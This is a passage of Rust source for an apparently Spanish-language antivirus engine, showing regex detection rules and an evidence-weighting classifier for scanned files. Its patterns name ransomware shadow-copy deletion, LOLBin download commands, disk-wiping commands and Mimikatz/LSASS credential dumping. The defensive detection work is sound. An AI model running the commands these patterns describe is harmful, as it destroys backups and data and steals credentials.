                description: "PatrÃ³n de persistencia maliciosa mediante tareas cron o servicios systemd con descarga oculta".to_string(),
                pattern: re,
                severity: "Alta".to_string(),
            });
        }

        // Regla 8: Ransomware & Sabotaje de Copias de Seguridad (Shadow Copies / Boot Policy)
        if let Ok(re) = Regex::new(
            r"(?i)(vssadmin(\.exe)?\s+delete\s+shadows|wmic(\.exe)?\s+shadowcopy\s+delete|bcdedit(\.exe)?\s+/set\s+\{default\}\s+bootstatuspolicy\s+ignoreallfailures|wbadmin(\.exe)?\s+delete\s+catalog)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Ransomware.Win32.ShadowCopyWiper".to_string(),
                description: "Comandos destructivos diseÃ±ados para neutralizar copias de seguridad VSS y restauraciones del sistema".to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 9: Script Downloader / LOLBins (Certutil, Bitsadmin, Mshta, Regsvr32)
        if let Ok(re) = Regex::new(
            r"(?i)(certutil(\.exe)?\s+(-urlcache|-f\s+-split)|bitsadmin(\.exe)?\s+/transfer|mshta(\.exe)?\s+(https?|javascript|vbscript)|regsvr32(\.exe)?\s+/s\s+/u\s+/i:https?)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Heuristic.Script.LOLBinDownloader".to_string(),
                description: "Uso de binarios legÃ­timos de Windows (LOLBins) para descarga y ejecuciÃ³n furtiva de malware".to_string(),
                pattern: re,
                severity: "Alta".to_string(),
            });
        }

        // Regla 10: Comandos destructivos masivos (Wipers / Scripts de formateo o eliminaciÃ³n)
        if let Ok(re) = Regex::new(
            r"(?i)(del\s+/[fF]\s+/[sS]\s+/[qQ]\s+[cC]:\\|rd\s+/[sS]\s+/[qQ]\s+[cC]:\\|format\s+[cC]:\s+/fs:ntfs\s+/q\s+/y)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Trojan.Script.WiperDestructive".to_string(),
                description: "Comandos destructivos orientados a la destrucciÃ³n masiva del disco o sistema operativo".to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 11: Robo de credenciales y extracción de LSASS (Mimikatz / Procdump)
        if let Ok(re) = Regex::new(
            r"(?i)(sekurlsa::logonpasswords|lsadump::sam|privilege::debug|procdump(\.exe)?.*?-ma.*?lsass)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "HackTool.Win32.MimikatzCredentialDump".to_string(),
                description: "Herramienta o script para extracción de credenciales en memoria LSASS y hashes SAM".to_string(),
                pattern: re,
                severity: "Crítica".to_string(),
            });
        }

        // Regla 12: Firma de prueba segura para validación de exclusiones y falsos positivos
        if let Ok(re) = Regex::new(r"(?i)SAMULIBRE_TEST_TOKEN_SUSPICIOUS_PAYLOAD_VALIDATION") {
            self.pattern_rules.push(PatternRule {
                name: "TestSign.SamuLibre.ExclusionValidation".to_string(),
                description: "Firma de prueba interna para validación criptográfica de exclusiones"
                    .to_string(),
                pattern: re,
                severity: "Prueba".to_string(),
            });
        }

        // Regla 13: Aplicaciones potencialmente no deseadas (PUA / Mineros de Criptomonedas AMTSO Feature 2)
        if let Ok(re) = Regex::new(
            r"(?i)(stratum\+tcp://|xmrig|monero\.org|cryptonight|minergate|silentminer|coinhive)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "PUA.Win32.CoinMiner.Gen".to_string(),
                description: "Aplicación potencialmente no deseada (PUA): Minero de criptomonedas no autorizado".to_string(),
                pattern: re,
                severity: "Media".to_string(),
            });
        }
    }

    /// Evalúa todas las evidencias independientes (firmas, YARA, PDF, PE, entropía, procedencia y Authenticode)
    /// y emite una clasificación calibrada con uno de los 4 niveles de confianza.
    pub fn evaluate_evidence_and_classify(
        &self,
        path_ref: &Path,
        content: &[u8],
        sha256_hash: &str,
        gpu_entropy_override: Option<f64>,
        gpu_poly_override: Option<PolymorphicProfile>,
        check_origin_ads: bool,
        start: Instant,
    ) -> ScanResult {
        use samulibre_types::{AuthenticodeSummary, DetectionEvidence, EvidenceCategory};

        let mut evidences: Vec<DetectionEvidence> = Vec::new();
        let mut authenticode_summary: Option<AuthenticodeSummary> = None;

        // 1. Firmas SHA-256 (O(1) Bloom / HashMap)
        if let Some(sig) = self.signature_store.lookup(sha256_hash) {
            evidences.push(DetectionEvidence {
                category: EvidenceCategory::SignatureHash,
                rule_id: sig.threat_name.clone(),
                description: format!("Coincidencia exacta SHA-256 en SignatureStore ({})", sig.category),
                weight: 100,
                is_definitive: true,
                source_feed: Some(sig.category.clone()),
            });
        }
        if let Some(detection) = self.known_signatures.get(sha256_hash) {
            evidences.push(DetectionEvidence {
                category: EvidenceCategory::SignatureHash,
                rule_id: detection.clone(),
                description: "Coincidencia exacta SHA-256 en base de firmas local".to_string(),
                weight: 100,
                is_definitive: true,
                source_feed: Some("LocalSignatureBase".to_string()),
            });
        }

        // 2. Reglas de patrones y YARA (recopila TODAS las coincidencias, no early-return)
        for rule in collect_pattern_rules(path_ref, content, &self.pattern_rules) {
            let is_eicar = rule.name.eq_ignore_ascii_case("EICAR_Test_File_Signature")
                || rule.name.eq_ignore_ascii_case("YARA.eicar")
                || rule.name.eq_ignore_ascii_case("TestSign.SamuLibre.ExclusionValidation");
            let is_validated_exploit_rule = matches!(
                rule.name.as_str(),
                "Exploit.Bypass.AmsiPatchingAttempt"
                    | "Ransomware.Win32.ShadowCopyWiper"
                    | "Trojan.Linux.InteractiveReverseShell"
                    | "Rootkit.Linux.LdPreloadHook"
                    | "Trojan.Spy.ChromiumCredentialHarvester"
            );
            let weight = if is_eicar {
                100
            } else if is_validated_exploit_rule {
                65
            } else if rule.name.starts_with("YARA.") {
                // Regla YARA comunitaria: aporta sospecha moderada, requiere corroboración para ALTO/CRÍTICO
                42
            } else if rule.severity.to_lowercase().contains("crít")
                || rule.severity.to_lowercase().contains("crit")
            {
                55
            } else {
                45
            };
            evidences.push(DetectionEvidence {
                category: if is_eicar {
                    EvidenceCategory::SignatureHash
                } else {
                    EvidenceCategory::YaraRule
                },
                rule_id: rule.name.clone(),
                description: rule.description.clone(),
                weight,
                is_definitive: is_eicar,
                source_feed: Some(if rule.name.starts_with("YARA.") {
                    "CommunityYARA".to_string()
                } else {
                    "SamuLibreRules".to_string()
                }),
            });
        }

        // 2b. Motor YARA-X real compilado (sin filtro artificial de subcadenas)
        if let Some(ref yara_rt) = self.yara_runtime {
            let fname = path_ref
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap_or("");
            let fpath = path_ref.to_string_lossy();
            let fext = path_ref
                .extension()
                .and_then(|s| s.to_str())
                .unwrap_or("");
            let ftype = if content.starts_with(b"MZ") {
                "PE"
            } else if content.starts_with(b"\x7FELF") {
                "ELF"
            } else if content.starts_with(b"%PDF") {
                "PDF"
            } else {
                ""
            };
            let p_lower = path_ref.to_string_lossy().to_ascii_lowercase();
            let fname_lower = fname.to_ascii_lowercase();
            let is_os_ps_policy_probe = p_lower.contains("\\temp\\")
                && fname_lower.starts_with("__psscriptpolicytest_")
                && (fext.eq_ignore_ascii_case("ps1") || fext.eq_ignore_ascii_case("psm1"));
            let is_pure_media_ext = matches!(
                fext.to_ascii_lowercase().as_str(),
                "png" | "jpg" | "jpeg" | "gif" | "webp" | "mp3" | "mp4" | "avi" | "mkv" | "wav" | "flac" | "woff2" | "ttf"
            );
            let skip_yara_preclass = is_os_ps_policy_probe
                || (is_pure_media_ext
                    && ftype.is_empty()
                    && !p_lower.contains("\\temp\\")
                    && !p_lower.contains("\\downloads\\"))
                || (content.len() > 16 * 1024 * 1024 && ftype.is_empty());
            if !skip_yara_preclass {
                if let Ok(yara_hits) = yara_rt.scan_bytes(content, fname, &fpath, fext, ftype) {
                    for hit in yara_hits {
                        let r_lower = hit.rule_name.to_ascii_lowercase();
                        let is_eicar = r_lower == "eicar" || r_lower.contains("eicar");
                        let is_generic_or_utility = matches!(
                            r_lower.as_str(),
                            "powershell" | "ip" | "borland" | "upx" | "base64d_pe"
                        ) || r_lower.starts_with("susp_")
                            || r_lower.starts_with("pua_")
                            || r_lower.starts_with("hktl_")
                            || r_lower.starts_with("gen_")
                            || r_lower.starts_with("tool_")
                            || r_lower.starts_with("info_");
                        let weight = if is_eicar {
                            100
                        } else if is_generic_or_utility {
                            30
                        } else {
                            55
                        };
                        evidences.push(DetectionEvidence {
                            category: if is_eicar {
                                EvidenceCategory::SignatureHash
                            } else {
                                EvidenceCategory::YaraRule
                            },
                            rule_id: format!("YARAX.{}", hit.rule_name),
                            description: hit
                                .description
                                .unwrap_or_else(|| format!("Coincidencia YARA-X ({})", hit.rule_name)),
                            weight,
                            is_definitive: is_eicar,
                            source_feed: Some(format!("YARA-X:{}", hit.namespace)),
                        });
                    }
                }
            }
        }

        // 3. Documentos / PDFs maliciosos
        let is_archive_or_media = is_archive_or_media_file(path_ref);
        let is_doc = is_document_file(path_ref);
        let is_pdf = content.starts_with(b"%PDF")
            || path_ref
                .extension()
                .and_then(|s| s.to_str())
                .map(|e| e.eq_ignore_ascii_case("pdf"))
                .unwrap_or(false);

        if is_pdf {
            if is_suspicious_pdf(content) {
                evidences.push(DetectionEvidence {
                    category: EvidenceCategory::DocumentExploit,
                    rule_id: "Exploit.PDF.ActiveScriptOrLaunchTrigger".to_string(),
                    description: "PDF contiene etiquetas /JS, /JavaScript o /Launch combinadas con primitivas de ejecución/ofuscación".to_string(),
                    weight: 65,
                    is_definitive: false,
                    source_feed: Some("DocumentShield/AI".to_string()),
                });
            }
        } else if !is_archive_or_media && !is_doc && content.len() > 1024 * 10 {
            let ext = path_ref
                .extension()
                .and_then(|s| s.to_str())
                .unwrap_or("")
                .to_lowercase();
            let is_pe_or_exec = content.starts_with(b"MZ")
                || content.starts_with(b"\x7FELF")
                || matches!(
                    ext.as_str(),
                    "exe" | "dll" | "sys" | "scr" | "pif" | "cpl" | "com"
                );

            if is_pe_or_exec {
                // 3.1 Análisis Estructural PE
                let pe_report_opt = PeAnalyzer::analyze(content);
                if let Some(ref pe_report) = pe_report_opt {
                    let needs_trust_check = pe_report.is_suspicious
                        || !pe_report.indicators.is_empty()
                        || !evidences.is_empty();
                    authenticode_summary = Some(if needs_trust_check {
                        authenticode::verify_authenticode_cached(
                            path_ref,
                            &sha256_hash,
                            true,
                        )
                    } else {
                        AuthenticodeSummary {
                            is_signed: pe_report.has_authenticode_signature,
                            is_valid_chain: false,
                            publisher: None,
                            status_detail: if pe_report.has_authenticode_signature {
                                "Tabla Authenticode presente (sin indicadores de riesgo)".to_string()
                            } else {
                                "Sin firma Authenticode embebida".to_string()
                            },
                        }
                    });

                    if pe_report.is_suspicious || !pe_report.indicators.is_empty() {
                        for ind in &pe_report.indicators {
                            let code_u = ind.code.to_ascii_uppercase();
                            // Evitar doble conteo: indicadores puramente de entropía/empaquetado o timestamp
                            // van a EntropyObfuscation (peso <= 22) para no simular 2 categorías independientes.
                            let is_entropy_or_meta_only = code_u.contains("ENTROP")
                                || code_u.contains("PACKED")
                                || code_u.contains("TIMESTAMP")
                                || code_u.contains("AUTHENT")
                                || code_u.contains("UNSIGNED");
                            let (cat, calibrated_w) = if is_entropy_or_meta_only {
                                (
                                    EvidenceCategory::EntropyObfuscation,
                                    (ind.weight as i32).min(22),
                                )
                            } else {
                                (EvidenceCategory::StructuralPe, (ind.weight as i32).min(60))
                            };
                            if calibrated_w > 0 {
                                evidences.push(DetectionEvidence {
                                    category: cat,
                                    rule_id: ind.code.clone(),
                                    description: ind.description.clone(),
                                    weight: calibrated_w,
                                    is_definitive: false,
                                    source_feed: Some("PeStructuralEngine".to_string()),
                                });
                            }
                        }
                    }
                }

                // 3.2 Entropía y perfil polimórfico (si no aplica exclusión anti-FP de instalador/.NET/OS
                // y si PeAnalyzer no registró ya una evidencia de EntropyObfuscation, evitando doble conteo)
                let already_has_entropy_ev = evidences
                    .iter()
                    .any(|e| e.category == EvidenceCategory::EntropyObfuscation);
                let skip_entropy_fp =
                    should_skip_entropy_fp(path_ref, content, pe_report_opt.as_ref());
                if !skip_entropy_fp && !already_has_entropy_ev {
                    let poly_profile = gpu_poly_override.unwrap_or_else(|| {
                        analyze_polymorphic_entropy(content, &path_ref.to_string_lossy())
                    });
                    if poly_profile.is_likely_polymorphic {
                        // Por sí sola la entropía polimórfica + Temp/Downloads NO condena (22 + 10 = 32 < 35),
                        // pero correlacionada con PE/YARA eleva la confianza.
                        evidences.push(DetectionEvidence {
                            category: EvidenceCategory::EntropyObfuscation,
                            rule_id: "Heuristic.Polymorphic.PackedPayload".to_string(),
                            description: poly_profile
                                .reason
                                .unwrap_or_else(|| "Perfil de entropía polimórfica anómalo".to_string()),
                            weight: 22,
                            is_definitive: false,
                            source_feed: Some("AI/PolymorphicEngine".to_string()),
                        });
                    } else {
                        let sample_len = std::cmp::min(content.len(), 64 * 1024);
                        let entropy = gpu_entropy_override
                            .unwrap_or_else(|| gpu_hook::accelerated_entropy(&content[..sample_len]));
                        if entropy > 7.85 {
                            evidences.push(DetectionEvidence {
                                category: EvidenceCategory::EntropyObfuscation,
                                rule_id: format!("AI.Heuristic.PackedSuspiciousEntropy (H={:.2})", entropy),
                                description: format!(
                                    "Entropía de Shannon elevada ({:.2} > 7.85); requiere corroboración independiente",
                                    entropy
                                ),
                                weight: 20,
                                is_definitive: false,
                                source_feed: Some("AI/EntropyModel".to_string()),
                            });
                        }
                    }
                }
            }
        }

        // 4. Contexto de procedencia y ruta (solo si ya existe al menos 1 evidencia, sin overhead en archivos limpios)
        if !evidences.is_empty() {
            let p_lower = path_ref.to_string_lossy().to_ascii_lowercase();
            if p_lower.contains("\\appdata\\local\\temp\\")
                || p_lower.contains("\\temp\\")
                || p_lower.contains("\\downloads\\")
            {
                evidences.push(DetectionEvidence {
                    category: EvidenceCategory::OriginContext,
                    rule_id: "Context.Origin.UserTempOrDownloads".to_string(),
                    description: "Ubicado en directorio de descargas o temporales de usuario (contexto corroborante)".to_string(),
                    weight: 10,
                    is_definitive: false,
                    source_feed: Some("OriginContext".to_string()),
                });
            }

            #[cfg(target_os = "windows")]
            if check_origin_ads {
                let ads_path = format!("{}:Zone.Identifier", path_ref.display());
                if let Ok(ads) = fs::read_to_string(&ads_path) {
                    if ads.contains("ZoneId=3") || ads.contains("HostUrl=") {
                        evidences.push(DetectionEvidence {
                            category: EvidenceCategory::OriginContext,
                            rule_id: "Context.Origin.MarkOfTheWeb".to_string(),
                            description: "Archivo marcado con Zone.Identifier (ZoneId=3 / Internet)".to_string(),
                            weight: 12,
                            is_definitive: false,
                            source_feed: Some("Zone.Identifier".to_string()),
                        });
                    }
                }
            }
        }

        let mut decision = self.classifier.classify(evidences, authenticode_summary);
        if decision.status != FileScanStatus::Clean {
            let has_definitive_hash = decision.evidences.iter().any(|e| {
                e.is_definitive && e.category == EvidenceCategory::SignatureHash
            });
            let yara_count = decision
                .evidences
                .iter()
                .filter(|e| e.category == EvidenceCategory::YaraRule)
                .count();
            let heur_count = decision
                .evidences
                .iter()
                .filter(|e| {
                    matches!(
                        e.category,
                        EvidenceCategory::StructuralPe
                            | EvidenceCategory::EntropyObfuscation
                            | EvidenceCategory::DocumentExploit
                    )
                })
                .count();
            let distinct_sources: std::collections::HashSet<&str> = decision
                .evidences
                .iter()
                .filter_map(|e| e.source_feed.as_deref())
                .collect();
            let has_valid_auth = decision
                .authenticode
                .as_ref()
                .map(|a| a.is_signed && a.is_valid_chain)
                .unwrap_or(false);
            let publisher = decision
                .authenticode
                .as_ref()
                .and_then(|a| a.publisher.clone());
            let path_str = path_ref.to_string_lossy().to_string();
            let is_protected = samulibre_intel::AntiFalsePositiveEngine::is_protected_context_path(&path_str);

            let fp_input = samulibre_intel::FpEvaluationInput {
                file_path: path_str,
                has_definitive_hash_match: has_definitive_hash,
                yara_match_count: yara_count,
                heuristic_match_count: heur_count,
                independent_sources_count: distinct_sources.len(),
                max_source_reputation: if has_definitive_hash || yara_count > 0 { 90 } else { 60 },
                has_valid_authenticode: has_valid_auth,
                publisher,
                is_admin_or_dev_tool: is_protected,
                has_active_behavior_alert: false,
            };
            let fp_decision = samulibre_intel::AntiFalsePositiveEngine::evaluate(&fp_input);
            if (is_protected || has_valid_auth)
                && decision.status == FileScanStatus::Infected
                && !fp_decision.allow_auto_quarantine
            {
                match fp_decision.level {
                    samulibre_intel::ThreatDecisionLevel::Informativo if !has_definitive_hash && yara_count == 0 => {
                        decision.status = FileScanStatus::Clean;
                        decision.classification_label = format!(
                            "{} [Anti-FP: INFORMATIVO - {}]",
                            decision.classification_label, fp_decision.rationale
                        );
                    }
                    samulibre_intel::ThreatDecisionLevel::Sospechoso
                    | samulibre_intel::ThreatDecisionLevel::Informativo => {
                        decision.status = FileScanStatus::Suspicious;
                        decision.classification_label = format!(
                            "{} [Anti-FP: {}]",
                            decision.classification_label, fp_decision.rationale
                        );
                    }
                    _ => {}
                }
            }
        }

        ScanResult {
            file_path: path_ref.to_string_lossy().to_string(),
            sha256: sha256_hash.to_string(),
            status: decision.status,
            detection_name: decision.primary_detection_name,
            engine: decision.primary_engine,
            scan_time_ms: start.elapsed().as_millis() as u64,
            confidence_level: decision.confidence_level,
            calibrated_score: decision.calibrated_score,
            evidences: decision.evidences,
            classification: decision.classification_label,
            authenticode: decision.authenticode,
        }
    }

    /// Escanea un archivo individual utilizando firmas ClamAV/Hashes y reglas YARA/HeurÃ­sticas
    pub fn scan_file(&self, path: impl AsRef<Path>) -> Result<ScanResult> {
        let start = Instant::now();
        let path_ref = path.as_ref();

        if !path_ref.exists() {
            return Ok(ScanResult {
                file_path: path_ref.to_string_lossy().to_string(),
                sha256: String::new(),
                status: FileScanStatus::AccessDenied,
                detection_name: None,
                engine: "SamuLibre Multi-Engine".to_string(),
                scan_time_ms: 0,
                ..Default::default()
            });
        }

        // Blindaje Anti-Symlink / Anti-LPE:
        // No desreferenciar enlaces simbÃ³licos o junctions para evitar manipulaciÃ³n de archivos del sistema
        if let Ok(sym_meta) = fs::symlink_metadata(path_ref) {
            if sym_meta.file_type().is_symlink() {
                return Ok(ScanResult {
                    file_path: path_ref.to_string_lossy().to_string(),
                    sha256: String::new(),
                    status: FileScanStatus::Clean,
                    detection_name: Some(
                        "Omitido: Enlace simbÃ³lico o Junction NTFS (Blindaje Anti-LPE)"
                            .to_string(),
                    ),
                    engine: "SamuLibre Anti-Exploit".to_string(),
                    scan_time_ms: 0,
                    ..Default::default()
                });
            }
        }

        let metadata = match fs::metadata(path_ref) {
            Ok(m) => m,
            Err(e) => {
                if e.raw_os_error() == Some(225) {
                    return Ok(ScanResult {
                        file_path: path_ref.to_string_lossy().to_string(),
                        sha256: "BLOCKED_BY_KERNEL".to_string(),
                        status: FileScanStatus::Infected,
                        detection_name: Some(
                            "Threat.KernelInterception.MalwareConfirmed (OS Error 225)".to_string(),
                        ),
                        engine: "KernelLockdown/AVFilter".to_string(),
                        scan_time_ms: start.elapsed().as_millis() as u64,
                        confidence_level: samulibre_types::ConfidenceLevel::Critico,
                        calibrated_score: 100,
                        classification: "CRÍTICO / MALICIOSO CONFIRMADO".to_string(),
                        ..Default::default()
                    });
                }
                return Ok(ScanResult {
                    file_path: path_ref.to_string_lossy().to_string(),
                    sha256: String::new(),
                    status: FileScanStatus::AccessDenied,
                    detection_name: Some(format!("Error de acceso: {}", e)),
                    engine: "SamuLibre Multi-Engine".to_string(),
                    scan_time_ms: start.elapsed().as_millis() as u64,
                    ..Default::default()
                });
            }
        };

        let file_len = metadata.len();
        let file = match File::open(path_ref) {
            Ok(f) => f,
            Err(e) => {
                if e.raw_os_error() == Some(225) {
                    return Ok(ScanResult {
                        file_path: path_ref.to_string_lossy().to_string(),
                        sha256: "BLOCKED_BY_KERNEL".to_string(),
                        status: FileScanStatus::Infected,
                        detection_name: Some(
                            "Threat.KernelInterception.MalwareConfirmed (OS Error 225)".to_string(),
                        ),
                        engine: "KernelLockdown/AVFilter".to_string(),
                        scan_time_ms: start.elapsed().as_millis() as u64,
                        confidence_level: samulibre_types::ConfidenceLevel::Critico,
                        calibrated_score: 100,
                        classification: "CRÍTICO / MALICIOSO CONFIRMADO".to_string(),
                        ..Default::default()
                    });
                }
                return Ok(ScanResult {
                    file_path: path_ref.to_string_lossy().to_string(),
                    sha256: String::new(),
                    status: FileScanStatus::AccessDenied,
                    detection_name: Some(format!("Error de lectura: {}", e)),
                    engine: "SamuLibre Multi-Engine".to_string(),
                    scan_time_ms: start.elapsed().as_millis() as u64,
                    ..Default::default()
                });
            }
        };

        // ESTRATEGIA DE IA & TRIAGE INTELIGENTE DE ALTO RENDIMIENTO (ESTILO SENTINELONE / CROWDSTRIKE):
        // 1. Cabeceras PE, IATs, scripts maliciosos y droppers se encuentran siempre en los primeros 512 KB.
        // Un bÃºfer de 512 KB garantiza escaneo instantÃ¡neo en microsegundos sin sobrecargar la CPU con regex complejas.
        const MAX_SCAN_BUFFER: usize = 512 * 1024;
        let is_exec_or_script_ext = path_ref
            .extension()
            .and_then(|s| s.to_str())
            .map(|e| {
                matches!(
                    e.to_ascii_lowercase().as_str(),
                    "exe" | "dll" | "sys" | "scr" | "pif" | "cpl" | "com" | "msi" | "ps1" | "bat" | "cmd" | "vbs" | "hta" | "js" | "elf" | "so"
                )
            })
            .unwrap_or(false);
        let max_read = if is_exec_or_script_ext { 16 * 1024 * 1024 } else { MAX_SCAN_BUFFER };
        let mut reader = BufReader::new(file);

        let mut content = Vec::with_capacity(std::cmp::min(file_len as usize, MAX_SCAN_BUFFER));
        let mut chunk = [0u8; 64 * 1024]; // 64 KB chunk
        let mut hasher = Sha256::new();
        let mut total_read = 0usize;

        loop {
            let n = match reader.read(&mut chunk) {
                Ok(0) => break,
                Ok(n) => n,
                Err(_) => break,
            };

            hasher.update(&chunk[..n]);
            total_read += n;

            // Almacenar sólo hasta 512 KB para YARA-X, heurísticas y firmas en memoria
            if content.len() < MAX_SCAN_BUFFER {
                let to_take = std::cmp::min(n, MAX_SCAN_BUFFER - content.len());
                content.extend_from_slice(&chunk[..to_take]);
            }
            if total_read >= max_read {
                break;
            }
        }

        let sha256_hash = hex::encode(hasher.finalize());

        // 0. Verificación contra lista de exclusiones ancladas criptográficamente por SHA-256
        if self.exclusions.is_excluded(path_ref, Some(&sha256_hash)) {
            return Ok(ScanResult {
                file_path: path_ref.to_string_lossy().to_string(),
                sha256: sha256_hash,
                status: FileScanStatus::Clean,
                detection_name: Some("ExcluidoPorUsuario (HashPinned)".to_string()),
                engine: "SamuLibre/ExclusionManager".to_string(),
                scan_time_ms: start.elapsed().as_millis() as u64,
                ..Default::default()
            });
        }

        Ok(self.evaluate_evidence_and_classify(
            path_ref,
            &content,
            &sha256_hash,
            None,
            None,
            true,
            start,
        ))
    }

    /// Escanea un lote de archivos coalesciendo el cálculo de entropía y perfiles polimórficos
    /// en un único despacho Dual-GPU (Direct3D 11) para aprovechar ambas GPUs simultáneamente.
    pub fn scan_files_batch(&self, paths: &[std::path::PathBuf]) -> Vec<Result<ScanResult>> {
        if paths.len() <= 1 || !gpu_hook::has_gpu_provider() {
            return paths.iter().map(|p| self.scan_file(p)).collect();
        }

        struct PendingItem {
            idx: usize,
            path_str: String,
            sha256: String,
            content: Vec<u8>,
            is_pe_or_exec: bool,
            skip_entropy_fp: bool,
            start: Instant,
            sample_seg_idx: Option<usize>,
            poly_global_idx: Option<usize>,
            poly_chunk_start: usize,
            poly_chunk_count: usize,
        }

        let mut results: Vec<Option<Result<ScanResult>>> = (0..paths.len()).map(|_| None).collect();
        let mut pending: Vec<PendingItem> = Vec::with_capacity(paths.len());

        // Fase 1: Lectura, SHA-256, exclusiones, firmas Bloom/ClamAV, YARA-X y PDF
        let mut chunk = vec![0u8; 64 * 1024];

        for (idx, path) in paths.iter().enumerate() {
            let start = Instant::now();
            let path_ref = path.as_path();
            let path_str = path_ref.to_string_lossy().to_string();

            if !path_ref.exists() {
                results[idx] = Some(Ok(ScanResult {
                    file_path: path_str,
                    sha256: String::new(),
                    status: FileScanStatus::AccessDenied,
                    detection_name: None,
                    engine: "SamuLibre Multi-Engine".to_string(),
                    scan_time_ms: 0,
                    ..Default::default()
                }));
                continue;
            }
            if let Ok(sym_meta) = fs::symlink_metadata(path_ref) {
                if sym_meta.file_type().is_symlink() {
                    results[idx] = Some(Ok(ScanResult {
                        file_path: path_str,
                        sha256: String::new(),
                        status: FileScanStatus::Clean,
                        detection_name: Some("Omitido: Enlace simbólico o Junction NTFS (Blindaje Anti-LPE)".to_string()),
                        engine: "SamuLibre Anti-Exploit".to_string(),
                        scan_time_ms: 0,
                        ..Default::default()
                    }));
                    continue;
                }
            }
            let metadata = match fs::metadata(path_ref) {
                Ok(m) => m,
                Err(e) => {
                    results[idx] = Some(Ok(ScanResult {
                        file_path: path_str,
                        sha256: if e.raw_os_error() == Some(225) { "BLOCKED_BY_KERNEL".to_string() } else { String::new() },
                        status: if e.raw_os_error() == Some(225) { FileScanStatus::Infected } else { FileScanStatus::AccessDenied },
                        detection_name: Some(if e.raw_os_error() == Some(225) {
                            "Threat.KernelInterception.MalwareConfirmed (OS Error 225)".to_string()
                        } else {
                            format!("Error de acceso: {}", e)
                        }),
                        engine: if e.raw_os_error() == Some(225) { "KernelLockdown/AVFilter".to_string() } else { "SamuLibre Multi-Engine".to_string() },
                        scan_time_ms: start.elapsed().as_millis() as u64,
                        confidence_level: if e.raw_os_error() == Some(225) { samulibre_types::ConfidenceLevel::Critico } else { samulibre_types::ConfidenceLevel::Bajo },
                        calibrated_score: if e.raw_os_error() == Some(225) { 100 } else { 0 },
                        ..Default::default()
                    }));
                    continue;
                }
            };
            let file = match File::open(path_ref) {
                Ok(f) => f,
                Err(e) => {
                    results[idx] = Some(Ok(ScanResult {
                        file_path: path_str,
                        sha256: if e.raw_os_error() == Some(225) { "BLOCKED_BY_KERNEL".to_string() } else { String::new() },
                        status: if e.raw_os_error() == Some(225) { FileScanStatus::Infected } else { FileScanStatus::AccessDenied },
                        detection_name: Some(if e.raw_os_error() == Some(225) {
                            "Threat.KernelInterception.MalwareConfirmed (OS Error 225)".to_string()
                        } else {
                            format!("Error de lectura: {}", e)
                        }),
                        engine: if e.raw_os_error() == Some(225) { "KernelLockdown/AVFilter".to_string() } else { "SamuLibre Multi-Engine".to_string() },
                        scan_time_ms: start.elapsed().as_millis() as u64,
                        confidence_level: if e.raw_os_error() == Some(225) { samulibre_types::ConfidenceLevel::Critico } else { samulibre_types::ConfidenceLevel::Bajo },
                        calibrated_score: if e.raw_os_error() == Some(225) { 100 } else { 0 },
                        ..Default::default()
                    }));
                    continue;
                }
            };

            const MAX_SCAN_BUFFER: usize = 512 * 1024;
            let is_exec_or_script_ext = path_ref
                .extension()
                .and_then(|s| s.to_str())
                .map(|e| {
                    matches!(
                        e.to_ascii_lowercase().as_str(),
                        "exe" | "dll" | "sys" | "scr" | "pif" | "cpl" | "com" | "msi" | "ps1" | "bat" | "cmd" | "vbs" | "hta" | "js" | "elf" | "so"
                    )
                })
                .unwrap_or(false);
            let max_read = if is_exec_or_script_ext { 16 * 1024 * 1024 } else { MAX_SCAN_BUFFER };
            let mut file = file;
            let mut content = Vec::with_capacity(std::cmp::min(metadata.len() as usize, MAX_SCAN_BUFFER));
            let mut hasher = Sha256::new();
            let mut total_read = 0usize;
            loop {
                let n = match file.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => n,
                    Err(_) => break,
                };
                hasher.update(&chunk[..n]);
                total_read += n;
                if content.len() < MAX_SCAN_BUFFER {
                    let to_take = std::cmp::min(n, MAX_SCAN_BUFFER - content.len());
                    content.extend_from_slice(&chunk[..to_take]);
                }
                if total_read >= max_read {
                    break;
                }
            }
            let sha256_hash = hex::encode(hasher.finalize());

            if self.exclusions.is_excluded(path_ref, Some(&sha256_hash)) {
                results[idx] = Some(Ok(ScanResult {
                    file_path: path_str,
                    sha256: sha256_hash,
                    status: FileScanStatus::Clean,
                    detection_name: Some("ExcluidoPorUsuario (HashPinned)".to_string()),
                    engine: "SamuLibre/ExclusionManager".to_string(),
                    scan_time_ms: start.elapsed().as_millis() as u64,
                    ..Default::default()
                }));
                continue;
            }
            if self.signature_store.lookup(&sha256_hash).is_some()
                || self.known_signatures.contains_key(&sha256_hash)
            {
                results[idx] = Some(Ok(self.evaluate_evidence_and_classify(
                    path_ref,
                    &content,
                    &sha256_hash,
                    None,
                    None,
                    true,
                    start,
                )));
                continue;
            }

            let is_archive_or_media = is_archive_or_media_file(path_ref);
            let is_doc = is_document_file(path_ref);
            let ext = path_ref.extension().and_then(|s| s.to_str()).unwrap_or("").to_lowercase();
            let is_pe_or_exec = !is_archive_or_media
                && !is_doc
                && content.len() > 1024 * 10
                && (content.starts_with(b"MZ")
                    || content.starts_with(b"\x7FELF")
                    || matches!(ext.as_str(), "exe" | "dll" | "sys" | "scr" | "pif" | "cpl" | "com"));

            let mut skip_entropy_fp = false;
            if is_pe_or_exec {
                let pe_report_opt = PeAnalyzer::analyze(&content);
                skip_entropy_fp = should_skip_entropy_fp(path_ref, &content, pe_report_opt.as_ref());
            }

            // Encolar todo archivo no trivial (>= 2 KB) o PE/ejecutable para perfilado en lote en Dual-GPU
            // y clasificación multi-evidencia unificada
            if content.len() >= 2 * 1024 || is_pe_or_exec {
                pending.push(PendingItem {
                    idx,
                    path_str,
                    sha256: sha256_hash,
                    content,
                    is_pe_or_exec,
                    skip_entropy_fp,
                    start,
                    sample_seg_idx: None,
                    poly_global_idx: None,
                    poly_chunk_start: 0,
                    poly_chunk_count: 0,
                });
            } else {
                results[idx] = Some(Ok(self.evaluate_evidence_and_classify(
                    path_ref,
                    &content,
                    &sha256_hash,
                    None,
                    None,
                    true,
                    start,
                )));
            }
        }

        // Fase 2: Coalescer todos los segmentos del lote en un único despacho Dual-GPU
        if !pending.is_empty() {
